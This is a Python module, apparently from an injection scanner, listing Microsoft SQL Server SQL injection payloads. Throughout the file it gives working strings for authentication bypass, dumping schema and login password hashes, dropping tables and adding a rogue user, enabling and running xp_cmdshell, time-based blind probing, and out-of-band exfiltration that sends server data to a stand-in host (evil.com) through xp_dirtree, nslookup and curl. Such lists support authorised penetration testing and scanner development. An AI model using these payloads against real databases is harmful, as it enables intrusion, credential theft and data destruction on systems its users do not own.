"""mssql.py — Microsoft SQL Server Injection Payloads"""

MSSQL_PAYLOADS: list[str] = [
    # Version
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT SYSTEM_USER,USER_NAME(),DB_NAME()--",
    "' UNION SELECT @@servername,@@language,@@version--",
    # xp_cmdshell
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC xp_cmdshell('dir C:\\')--",
    "'; EXEC master..xp_cmdshell('ping -n 1 evil.com')--",
    "'; EXEC master.dbo.xp_cmdshell('net user')--",
    # Enable xp_cmdshell
    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
    # Information gathering
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT name,2,3 FROM sys.databases--",
    "' UNION SELECT name,2,3 FROM sys.tables--",
    "' UNION SELECT name,password_hash,3 FROM sys.sql_logins--",
    # Authentication bypass
    "admin'--",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "') OR ('1'='1'--",
    # Stacked queries
    "'; SELECT * FROM users--",
    "'; DROP TABLE users--",
    "'; INSERT INTO users(username,password) VALUES('hacker','password')--",
    # Openrowset SSRF
    "'; EXEC master..xp_dirtree '//evil.com/a'--",
    "'; DECLARE @q VARCHAR(8000); SET @q='\\\\evil.com\\share'; EXEC master.dbo.xp_dirtree @q--",
    # Error-based
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--",
    "' AND 1=CONVERT(int,user_name())--",
]

MSSQL_BLIND_TIME: list[str] = [
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' WAITFOR DELAY '0:0:5'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    "'; IF (1=2) WAITFOR DELAY '0:0:5'--",
    "' AND 1=1; WAITFOR DELAY '0:0:5'--",
    "' OR WAITFOR DELAY '0:0:5'--",
    "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
    # Conditional
    "'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5'--",
    "'; IF (SYSTEM_USER='sa') WAITFOR DELAY '0:0:5'--",
    # Fast (baseline)
    "'; WAITFOR DELAY '0:0:0'--",
    "1; WAITFOR DELAY '0:0:0'--",
]

MSSQL_OOB: list[str] = [
    # DNS OOB via xp_dirtree
    "'; EXEC master..xp_dirtree '//evil.com/a'--",
    "'; DECLARE @v VARCHAR(100); SET @v='\\\\'+@@version+'.evil.com\\a'; EXEC master.dbo.xp_dirtree @v--",
    # xp_cmdshell OOB
    "'; EXEC xp_cmdshell('nslookup evil.com')--",
    "'; EXEC xp_cmdshell('curl http://evil.com/?' + @@version)--",
    # OLE Automation Objects
    "'; EXEC sp_oacreate 'Shell.Application',@shell OUTPUT; EXEC sp_oamethod @shell,'ShellExecute',NULL,'cmd.exe','/c nslookup evil.com'--",
]
